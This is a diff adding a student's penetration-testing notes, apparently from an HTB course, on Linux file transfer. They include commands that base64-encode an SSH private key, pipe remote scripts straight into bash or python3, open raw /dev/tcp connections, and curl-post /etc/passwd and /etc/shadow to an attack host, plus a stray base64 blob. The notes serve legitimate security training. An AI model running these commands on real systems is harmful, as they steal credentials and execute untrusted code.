@@ -141,3 +141,95 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 use Netcat to listen in on a port specify and send the file as POST request. -> copy the output and use the base64 decode function to convert the base 64 string into a file
 PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+\\\\\\==================================
+LInux File transfer methods
+few: cURL, wget, Python, all use HTTP to communicate
+although  Linux can comm via FTP, SMB like Windows, most malware on all diff oS use HTTP and HTTPS for comm
+\\Download operations
+\\Base64Encoding / decoding
+- an method that does not require network comm, by encode a file to a base 64 string > copy its content into the terminal then perform the reverse operation
+Bash>$md5sum id_rsa 
+- we can use cat to print the file content, and base64 encode the output using a pipe | 
+use option -w 0 to create only one line and ended up with the command with a semi-colon(;) and echo to start new line and make it easier to copy
+$cat id_rsa | base64 -w 0;echo
+> coopy it to target linux $echo -n '<string base64>' | base64 -d > id_rsa
+confirm it was tranferred successfully using the md5sum command
+\\Linux - Confirm the MD5 Hashes IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo
+$md5sum id_rsa 
+NOTE: we can upload file using the reverse operation.from compromised target cat and base64 encode a file and decode it in pawnbox
+\\Web Downloads with Wget and cURL
+2 most common utilities in Linux distro to interact with web app are wget and curl 
+wget need to specify the URL and the option '-O' to set the output filename
+\\Download a File Using wget
+$wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+cURL is very similar to wget. but the output filename option is lowercase '-o'
+$curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+\\Fileless Attack using Linux
+because the way linux work and how pipes operation, most of the tools we use in Linux can be used to replicate fileless operation, which means that we dont have to download a file to execute it
+NOTE: some payload such as mkfifo write files to disk, keep in mind that while the execution of the payload may be fileless when use a pipe, depending on the payload chosen it may create temp files on the OS
+\\Fieless Download with cURL
+$curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+similar we can download a python script file from a web svr and pipe it into the python inary /
+\\Fileless download with wget 
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+this wwill execute 
+\\Download with Bash (/dev/tcp)
+in case non of well-known file transfer tools are available. as long as Bash version 2.04 or greater is installed (
+    compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file download
+\\Connect to the Target webserver
+$exec 3<>/dev/tcp/10.10.10.32/80
+\\HTTP GET request
+$exec -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+\\Print the Response
+$cat <&3
+\\SSH Downloads
+SSH comes with an SCP utility for remote file transfer by default uses the SSH Protocol
+SCP (secure copy) is a command-line utility allow copy and directories betw 2 host securely. we can copy file from local to remote svr and from remote svr to our mochine
+SCP is very similar to copy or cp but insted of provie a local path we need a specify a username the remote IP addr or DNS name , and the user's credentials
+\\Enabling the SSH Server
+$sudo systemctl enable SSH
+\\Starting the SSH Server
+$sudo systemctl start SSH
+\\Checking for SSH listening port
+$netstat -lnpt 
+\\Bigin downloading File using SCP 
+$scp plaintext@192.169.49.128:/root/myroot.txt .
+scp username@remote_host:/path/file /path/destination
+NOTE: we can create a temp user account for file transfer and avoid using your primary cred or keys on a remote computer
+\\Upload operations
+There also situation such as binary exploitation and packet capture analysis, where we must upload files from target machine onto or atk host.
+the methods for downloads will also work for uploads 
+\\Web upload
+- upload server https://github.com/Densaugeo/uploadserver extended module of the Python HTTP.server module which includes a file upload page.
+\\Pwnbox - start Web Server
+$sudo python3 -m pip install --user upload server
+\\pwn - Create a Self-Signed certificate
+$openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+-The Websvr should not hos the cert, we recommend creating a new dir to host the file for our server
+\\Pwnbox - Start web server
+$mkdir https && cd https
+$sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+\\Linux - Upload Multiple Files
+$curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+option --insecure because we used a self-signed cert that we trusted
+\\Alternative Web File Transfer Method
+linux distro usually have python or php installed, starting a web server to transfer file is straightforward.
+if the server compromised is a web svr, we can move the files we want to transfer to the web svr dir and access them from the web page which means that we are downloadng the file prom Pwnbox
+- it is possible to stand up a web svr using various languages. A compromised Linux Machine may not have a web server installed. in such cases we can use a mini web svr. what they perhaps lack in security, they make up for flexibility as the webroot location and listening ports can quickly be changed
+\\Linux-Creating a Web Server with Python3
+$python3 -m http.server
+\\Linux- Creating a Web Server with Python2.7
+$python2.7 -m SimpleHTTPServer
+\\linux-Creating a Web Server with php
+$php -S 0.0.0.0:8000
+\\Linux- Creating a Web Server with Ruby 
+$ruby -run -ehttpd . -p8000
+\\Download the File from the Target Machine onto the Pwnbox
+$wget 192.168.49.128:8000/filetotransfer.txt
+Note: when we start a new web server using Python or PHP, its important to consider that inbound traffic maybe blocked we are transferring a file from our target onto our atk host, but we are not uploading the file
+\\SCP Upload
+some company allow the SSH protocol (TCP/22) for outbound conn, and if that's the case, we can use an SSH svr with the scp utility to upload files,
+attemp to upload files to target machine using the SSH protocol 
+\\File Upload using SCP
+$scp /etc/passwd htp-student@10.129.86.90:/home/htb-student/
+NOTE: scp syntax is similar to cp or copy
